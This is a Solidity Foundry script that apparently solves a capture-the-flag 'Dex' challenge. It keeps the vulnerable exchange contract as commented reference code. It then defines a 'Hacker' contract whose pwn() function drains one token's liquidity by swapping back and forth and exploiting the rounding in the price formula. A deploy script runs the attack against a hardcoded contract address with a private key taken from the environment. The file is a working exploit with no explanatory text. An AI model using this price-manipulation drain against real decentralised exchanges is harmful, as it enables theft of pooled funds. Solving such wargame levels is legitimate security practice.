//SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
import "forge-std/Script.sol";
import "forge-std/console.sol";

// import "openzeppelin-contracts/contracts/token/ERC20/IERC20.sol";
// import "openzeppelin-contracts/contracts/token/ERC20/ERC20.sol";
// import 'openzeppelin-contracts/contracts/access/Ownable.sol';

interface Dex {
    function token1() external view returns(address);
    function token2() external view returns(address);
    function approve(address spender, uint amount) external;
    function swap(address from, address to, uint amount) external;
    function getSwapPrice(address from, address to, uint amount) external view returns(uint);
    function balanceOf(address token, address account) external view returns(uint);
}


interface IERC20 {
    function balanceOf(address account) external view returns (uint256);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    // function approve(address owner, address spender, uint256 amount) external returns (bool);
}


// contract Dex is Ownable {
//   address public token1;
//   address public token2;
//   constructor() {}

//   function setTokens(address _token1, address _token2) public onlyOwner {
//     token1 = _token1;
//     token2 = _token2;
//   }
  
//   function addLiquidity(address token_address, uint amount) public onlyOwner {
//     IERC20(token_address).transferFrom(msg.sender, address(this), amount);
//   }
  
//   function swap(address from, address to, uint amount) public {
//     require((from == token1 && to == token2) || (from == token2 && to == token1), "Invalid tokens");
//     require(IERC20(from).balanceOf(msg.sender) >= amount, "Not enough to swap");
//     uint swapAmount = getSwapPrice(from, to, amount);
//     IERC20(from).transferFrom(msg.sender, address(this), amount);
//     IERC20(to).approve(address(this), swapAmount);
//     IERC20(to).transferFrom(address(this), msg.sender, swapAmount);
//   }

//   function getSwapPrice(address from, address to, uint amount) public view returns(uint){
//     return((amount * IERC20(to).balanceOf(address(this)))/IERC20(from).balanceOf(address(this)));
//   }

//   function approve(address spender, uint amount) public {
//     SwappableToken(token1).approve(msg.sender, spender, amount);
//     SwappableToken(token2).approve(msg.sender, spender, amount);
//   }

//   function balanceOf(address token, address account) public view returns (uint){
//     return IERC20(token).balanceOf(account);
//   }
// }

// contract SwappableToken is ERC20 {
//   address private _dex;
//   constructor(address dexInstance, string memory name, string memory symbol, uint256 initialSupply) ERC20(name, symbol) {
//         _mint(msg.sender, initialSupply);
//         _dex = dexInstance;
//   }

//   function approve(address owner, address spender, uint256 amount) public {
//     require(owner != _dex, "InvalidApprover");
//     super._approve(owner, spender, amount);
//   }
// }

contract Hacker {
    Dex private immutable dex;
    IERC20 private immutable token1;
    IERC20 private immutable token2;
    constructor(Dex _dex) {
        dex = _dex;
        token1 = IERC20(_dex.token1());
        token2 = IERC20(_dex.token2());

    }

    function _swap(IERC20 from, IERC20 to) private {
        uint amount = from.balanceOf(address(this));
        dex.swap(address(from), address(to), amount);
    }


    function pwn () public {
        token1.transferFrom(msg.sender, address(this), token1.balanceOf(msg.sender));
        token2.transferFrom(msg.sender, address(this), token2.balanceOf(msg.sender));
        dex.approve(address(dex), type(uint).max);

        _swap(token1, token2);
        _swap(token2, token1);
        _swap(token1, token2);
        _swap(token2, token1);
        _swap(token1, token2);
        dex.swap(address(token2), address(token1), 45);

        require(dex.balanceOf(address(token1), address(dex)) == 0, "Hacker failed");

    }
}


contract DeployScript is Script {
    function setUp() public view {}

    function run() public {
        uint256 deployerPrivateKey = vm.envUint("PRIVATE_KEY");
        vm.startBroadcast(deployerPrivateKey);
        Dex target = Dex(0x13e62ca9f81B01cB1d8a0ab29820B444515018B9);
        Hacker hacker = new Hacker(target);
        target.approve(address(hacker), type(uint).max);
        hacker.pwn();
        vm.stopBroadcast();
    }
}